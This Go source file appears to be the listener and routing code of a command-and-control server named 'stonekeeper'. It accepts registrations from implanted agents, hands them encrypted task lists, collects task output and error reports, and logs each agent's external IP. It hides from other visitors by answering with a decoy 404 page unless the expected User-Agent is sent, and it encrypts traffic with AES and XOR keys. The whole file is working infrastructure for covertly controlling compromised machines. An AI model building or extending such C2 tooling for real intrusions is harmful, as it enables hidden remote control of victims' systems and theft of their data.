package routes

import (
	"context"
	"encoding/json"
	"fmt"
	"net/http"
	"os"
	"path/filepath"
	"stonekeeper/crypt"
	"stonekeeper/database"
	"strconv"
	"strings"
	"sync"
	"time"

	"github.com/fatih/color"
	"github.com/gin-gonic/gin"
)

var (
	servers = make(map[string]*http.Server)
	mutex   sync.Mutex
	// Colors
	red   = color.New(color.FgRed).SprintFunc()
	green = color.New(color.FgGreen).SprintFunc()
	blue  = color.New(color.FgBlue).SprintFunc()
	cyan  = color.New(color.FgCyan).SprintFunc()
)

// initializeRoutes sets up the routes for the application.
func initializeRoutes(router *gin.Engine) {
	// Group for /register routes
	registerGroup := router.Group("/register")
	{
		registerGroup.POST("/:id", handleRegister)
	}

	// Additional route groups and routes can be defined here
	taskGroup := router.Group("/tasks")
	{
		// For getting tasks
		taskGroup.GET("/:id", handleTaskGet)
		// For updating tasks status
		taskGroup.POST("/:id", handleTaskPost)
	}

	// Group for /error routes
	errorGroup := router.Group("/error")
	{
		errorGroup.POST("/:id", handleErrorPost)
	}
}

// customServerHeader returns a middleware function that sets the Server header.
func customServerHeader(serverHeaderValue string) gin.HandlerFunc {
	return func(c *gin.Context) {
		c.Writer.Header().Set("Server", serverHeaderValue)
		c.Next()
	}
}

// getBaseFilename checks if the file path exists and returns the base filename.
// It returns an error if the file or directory does not exist.
func getBaseFilename(fullPath string) (string, error) {
	// Check if the path exists
	if _, err := os.Stat(fullPath); os.IsNotExist(err) {
		return "", fmt.Errorf("file or directory does not exist: %s", fullPath)
	}

	// Extract and return the base filename
	return filepath.Base(fullPath), nil
}

// StartServer initializes the routes and starts the server.
func StartServer(listener *database.Listener) {
	router := gin.Default()

	// Apply the middleware with the custom server header value
	router.Use(customServerHeader(listener.ServerHeader))

	// Set the HTML rendering directory
	router.LoadHTMLFiles(listener.HTML404Path)

	// Get the base filename of the 404 page
	filename, err := getBaseFilename(listener.HTML404Path)
	if err != nil {
		fmt.Println("Error getting base filename:", err)
		return
	}

	// Set a custom 404 handler
	router.NoRoute(func(c *gin.Context) {
		c.HTML(http.StatusNotFound, filename, gin.H{})
	})

	// Set up the routes.
	initializeRoutes(router)

	// Create a new http.Server
	server := &http.Server{
		Addr:    listener.IP + ":" + listener.Port,
		Handler: router,
	}

	listenerID := strconv.Itoa(listener.ID)
	mutex.Lock()
	servers[listenerID] = server
	listener.Running = true
	err = database.UpdateListener(listener)
	if err != nil {
		fmt.Println("Error updating listener:", err)
	}
	mutex.Unlock()

	// Start the server as a goroutine
	go func() {
		if strings.EqualFold(listener.Protocol, "https") {
			// Start HTTPS server
			if err := server.ListenAndServeTLS(listener.SSLCertPath, listener.SSLKeyPath); err != nil && err != http.ErrServerClosed {
				// Handle errors starting the server
				fmt.Println("Error starting server:", err)
				mutex.Lock()
				delete(servers, listenerID)
				listener.Running = false
				err := database.UpdateListener(listener)
				if err != nil {
					fmt.Println("Error updating listener:", err)
				}
				mutex.Unlock()
			}
		} else {
			// Start HTTP server
			if err := server.ListenAndServe(); err != nil && err != http.ErrServerClosed {
				// Handle errors starting the server
				fmt.Println("Error starting server:", err)
				mutex.Lock()
				delete(servers, listenerID)
				listener.Running = false
				err := database.UpdateListener(listener)
				if err != nil {
					fmt.Println("Error updating listener:", err)
				}
				mutex.Unlock()
			}
		}
	}()
}

func ShutdownServer(listener *database.Listener) error {
	listenerID := strconv.Itoa(listener.ID)
	mutex.Lock()
	server, exists := servers[listenerID]
	mutex.Unlock()

	if !exists {
		return fmt.Errorf("server not found")
	}

	ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
	defer cancel()
	if err := server.Shutdown(ctx); err != nil {
		return err
	}

	// Remove the server from the map after successful shutdown
	mutex.Lock()
	delete(servers, listenerID)
	listener.Running = false
	err := database.UpdateListener(listener)
	if err != nil {
		fmt.Println("Error updating listener:", err)
		return err
	}
	mutex.Unlock()

	return nil
}

func handleRegister(c *gin.Context) {
	var agent database.Agent

	idParam := c.Param("id")
	id, err := strconv.Atoi(idParam)

	if err != nil {
		fmt.Println("Error converting ID parameter:", err)
		return
	}

	listener, err := database.GetListenerByID(id)
	if err != nil {
		fmt.Println("Error getting listener:", err)
		return
	}
	//fmt.Printf("%#v\n", listener)

	userAgent := c.GetHeader("User-Agent")
	equalFold := strings.EqualFold(userAgent, listener.UserAgent)

	if equalFold {

		// Get the encrypted base64 data
		rawData, err := c.GetRawData()
		if err != nil {
			fmt.Println("Error getting raw data:", err)
			filename, err := getBaseFilename(listener.HTML404Path)
			if err != nil {
				fmt.Println("Error getting base filename:", err)
				return
			}
			c.HTML(http.StatusNotFound, filename, gin.H{})
			return
		}
		encryptedAgent := string(rawData)

		//fmt.Printf("Encrypted agent: %s\n", encryptedAgent)
		//fmt.Printf("Received base64 length: %d\n", len(encryptedAgent))
		decryptedAgent, err := crypt.AesDecrypt(encryptedAgent, listener.AesKey, listener.XorKey, listener.IV)
		if err != nil {
			fmt.Println("Error decrypting agent:", err)
			filename, err := getBaseFilename(listener.HTML404Path)
			if err != nil {
				fmt.Println("Error getting base filename:", err)
				return
			}
			c.HTML(http.StatusNotFound, filename, gin.H{})
			return
		}
		//fmt.Printf("Decrypted agent: %s\n", decryptedAgent)

		// Unmarshal the JSON string into the agent variable
		err = json.Unmarshal([]byte(decryptedAgent), &agent)
		if err != nil {
			fmt.Println("Error unmarshalling agent:", err)
			filename, err := getBaseFilename(listener.HTML404Path)
			if err != nil {
				fmt.Println("Error getting base filename:", err)
				return
			}
			c.HTML(http.StatusNotFound, filename, gin.H{})
			return
		}

		// Populate agent values
		agent.Time = time.Now().Format("2006-01-02 15:04:05.999999")
		agent.ExternalIP = c.ClientIP()

		// Insert agent into database
		err = database.InsertAgent(&agent)
		if err != nil {
			fmt.Println("Error inserting agent:", err)
			filename, err := getBaseFilename(listener.HTML404Path)
			if err != nil {
				fmt.Println("Error getting base filename:", err)
				return
			}
			c.HTML(http.StatusNotFound, filename, gin.H{})
			return
		}

		// Convert the struct to a JSON string
		jsonData, err := json.Marshal(agent)
		if err != nil {
			fmt.Println("Error marshalling agent:", err)
			filename, err := getBaseFilename(listener.HTML404Path)
			if err != nil {
				fmt.Println("Error getting base filename:", err)
				return
			}
			c.HTML(http.StatusNotFound, filename, gin.H{})
			return
		}

		encryptedAgent, err = crypt.AesEncrypt(string(jsonData), listener.AesKey, listener.XorKey, listener.IV)
		if err != nil {
			fmt.Println("Error encrypting agent:", err)
			filename, err := getBaseFilename(listener.HTML404Path)
			if err != nil {
				fmt.Println("Error getting base filename:", err)
				return
			}
			c.HTML(http.StatusNotFound, filename, gin.H{})
			return
		}

		c.String(http.StatusOK, encryptedAgent)
		//fmt.Printf("\nAgent registered with ID: %d\n", agent.ID)
		_, err = database.ListAgents()
		if err != nil {
			fmt.Println("Error listing agents:", err)
			return
		}
		return
	} else {
		fmt.Println("Error: invalid user agent")
		filename, err := getBaseFilename(listener.HTML404Path)
		if err != nil {
			fmt.Println("Error getting base filename:", err)
			return
		}
		c.HTML(http.StatusNotFound, filename, gin.H{})
		return
	}
}

func handleTaskGet(c *gin.Context) {
	idParam := c.Param("id")
	id, err := strconv.Atoi(idParam)

	if err != nil {
		fmt.Println("Error converting ID parameter:", err)
		return
	}

	// Get the agent
	agent, err := database.GetAgentByID(id)
	if err != nil {
		fmt.Println("Error getting agent:", err)
		return
	}

	// Get the listener for the agent
	listener, err := database.GetListenerByID(agent.ListenerID)
	if err != nil {
		fmt.Println("Error getting listener:", err)
		return
	}

	userAgent := c.GetHeader("User-Agent")
	equalFold := strings.EqualFold(userAgent, listener.UserAgent)

	if equalFold {
		// Get the tasks for the agent
		tasks, err := database.GetTasksForAgent(id, false, true)
		if err != nil {
			fmt.Println("Error getting tasks:", err)
			filename, err := getBaseFilename(listener.HTML404Path)
			if err != nil {
				fmt.Println("Error getting base filename:", err)
				return
			}
			c.HTML(http.StatusNotFound, filename, gin.H{})
			return
		}

		// If there are tasks, filter them
		if len(tasks) != 0 {
			// Update the agent checkin time
			err = database.UpdateAgentCheckinByID(id)
			if err != nil {
				fmt.Println("Error updating agent checkin:", err)
				filename, err := getBaseFilename(listener.HTML404Path)
				if err != nil {
					fmt.Println("Error getting base filename:", err)
					return
				}
				c.HTML(http.StatusNotFound, filename, gin.H{})
				return
			}

			// Marshal the slice into a JSON string
			jsonData, err := json.Marshal(tasks)
			if err != nil {
				fmt.Println("Error marshalling tasks:", err)
				filename, err := getBaseFilename(listener.HTML404Path)
				if err != nil {
					fmt.Println("Error getting base filename:", err)
					return
				}
				c.HTML(http.StatusNotFound, filename, gin.H{})
				return
			}

			// Encrypt the JSON string
			encryptedTasks, err := crypt.AesEncrypt(string(jsonData), listener.AesKey, listener.XorKey, listener.IV)
			if err != nil {
				fmt.Println("Error encrypting tasks:", err)
				filename, err := getBaseFilename(listener.HTML404Path)
				if err != nil {
					fmt.Println("Error getting base filename:", err)
					return
				}
				c.HTML(http.StatusNotFound, filename, gin.H{})
				return
			}

			c.String(http.StatusOK, encryptedTasks)
			return
		} else {
			c.Status(http.StatusNoContent)
			return
		}
	} else {
		fmt.Println("Error: invalid user agent")
		filename, err := getBaseFilename(listener.HTML404Path)
		if err != nil {
			fmt.Println("Error getting base filename:", err)
			return
		}
		c.HTML(http.StatusNotFound, filename, gin.H{})
		return
	}
}

func handleTaskPost(c *gin.Context) {
	idParam := c.Param("id")
	id, err := strconv.Atoi(idParam)

	if err != nil {
		fmt.Println("Error converting ID parameter:", err)
		return
	}

	// Get the agent
	agent, err := database.GetAgentByID(id)
	if err != nil {
		fmt.Println("Error getting agent:", err)
		return
	}

	// Get the listener for the agent
	listener, err := database.GetListenerByID(agent.ListenerID)
	if err != nil {
		fmt.Println("Error getting listener:", err)
		return
	}

	userAgent := c.GetHeader("User-Agent")
	equalFold := strings.EqualFold(userAgent, listener.UserAgent)

	if equalFold {
		// Update the agent checkin time
		err = database.UpdateAgentCheckinByID(id)
		if err != nil {
			fmt.Println("Error updating agent checkin:", err)
			filename, err := getBaseFilename(listener.HTML404Path)
			if err != nil {
				fmt.Println("Error getting base filename:", err)
				return
			}
			c.HTML(http.StatusNotFound, filename, gin.H{})
			return
		}

		// Get the encrypted base64 data
		rawData, err := c.GetRawData()
		if err != nil {
			fmt.Println("Error getting raw data:", err)
			filename, err := getBaseFilename(listener.HTML404Path)
			if err != nil {
				fmt.Println("Error getting base filename:", err)
				return
			}
			c.HTML(http.StatusNotFound, filename, gin.H{})
			return
		}
		encryptedTask := string(rawData)

		// Decrypt the task result
		decryptedTask, err := crypt.AesDecrypt(encryptedTask, listener.AesKey, listener.XorKey, listener.IV)
		if err != nil {
			fmt.Println("Error decrypting agent:", err)
			filename, err := getBaseFilename(listener.HTML404Path)
			if err != nil {
				fmt.Println("Error getting base filename:", err)
				return
			}
			c.HTML(http.StatusNotFound, filename, gin.H{})
			return
		}

		task := database.Task{}

		// Unmarshal the JSON string into the agent variable
		err = json.Unmarshal([]byte(decryptedTask), &task)
		if err != nil {
			fmt.Println("Error unmarshalling agent:", err)
			filename, err := getBaseFilename(listener.HTML404Path)
			if err != nil {
				fmt.Println("Error getting base filename:", err)
				return
			}
			c.HTML(http.StatusNotFound, filename, gin.H{})
			return
		}

		fmt.Printf("\n%s Agent %s completed task %s with output:\n\n%s\n> ", green("[+]"), cyan(fmt.Sprintf("%d", id)), red(fmt.Sprintf("%d", task.ID)), task.Result)

		task.EndTime = time.Now().Format("2006-01-02 15:04:05.999999")

		// Update the task in the database
		err = database.UpdateTask(&task)
		if err != nil {
			fmt.Println("Error updating task:", err)
			filename, err := getBaseFilename(listener.HTML404Path)
			if err != nil {
				fmt.Println("Error getting base filename:", err)
				return
			}
			c.HTML(http.StatusNotFound, filename, gin.H{})
			return
		}

		c.Status(http.StatusOK)
		return
	} else {
		fmt.Println("Error: invalid user agent")
		filename, err := getBaseFilename(listener.HTML404Path)
		if err != nil {
			fmt.Println("Error getting base filename:", err)
			return
		}
		c.HTML(http.StatusNotFound, filename, gin.H{})
		return
	}
}

func handleErrorPost(c *gin.Context) {
	idParam := c.Param("id")
	id, err := strconv.Atoi(idParam)

	if err != nil {
		fmt.Println("Error converting ID parameter:", err)
		return
	}

	// Get the agent
	agent, err := database.GetAgentByID(id)
	if err != nil {
		fmt.Println("Error getting agent:", err)
		return
	}

	// Get the listener for the agent
	listener, err := database.GetListenerByID(agent.ListenerID)
	if err != nil {
		fmt.Println("Error getting listener:", err)
		return
	}

	userAgent := c.GetHeader("User-Agent")
	equalFold := strings.EqualFold(userAgent, listener.UserAgent)

	if equalFold {
		// Update the agent checkin time
		err = database.UpdateAgentCheckinByID(id)
		if err != nil {
			fmt.Println("Error updating agent checkin:", err)
			filename, err := getBaseFilename(listener.HTML404Path)
			if err != nil {
				fmt.Println("Error getting base filename:", err)
				return
			}
			c.HTML(http.StatusNotFound, filename, gin.H{})
			return
		}

		// Get the encrypted base64 data
		rawData, err := c.GetRawData()
		if err != nil {
			fmt.Println("Error getting raw data:", err)
			filename, err := getBaseFilename(listener.HTML404Path)
			if err != nil {
				fmt.Println("Error getting base filename:", err)
				return
			}
			c.HTML(http.StatusNotFound, filename, gin.H{})
			return
		}
		encryptedTask := string(rawData)

		// Decrypt the error message
		decryptedError, err := crypt.AesDecrypt(encryptedTask, listener.AesKey, listener.XorKey, listener.IV)
		if err != nil {
			fmt.Println("Error decrypting agent:", err)
			filename, err := getBaseFilename(listener.HTML404Path)
			if err != nil {
				fmt.Println("Error getting base filename:", err)
				return
			}
			c.HTML(http.StatusNotFound, filename, gin.H{})
			return
		}

		fmt.Printf("\n%s Agent %s recently encountered an exception with output:\n\n%s\n> ", red("[-]"), cyan(fmt.Sprintf("%d", id)), red(decryptedError))
		c.Status(http.StatusOK)
		return
	} else {
		fmt.Println("Error: invalid user agent")
		filename, err := getBaseFilename(listener.HTML404Path)
		if err != nil {
			fmt.Println("Error getting base filename:", err)
			return
		}
		c.HTML(http.StatusNotFound, filename, gin.H{})
		return
	}
}
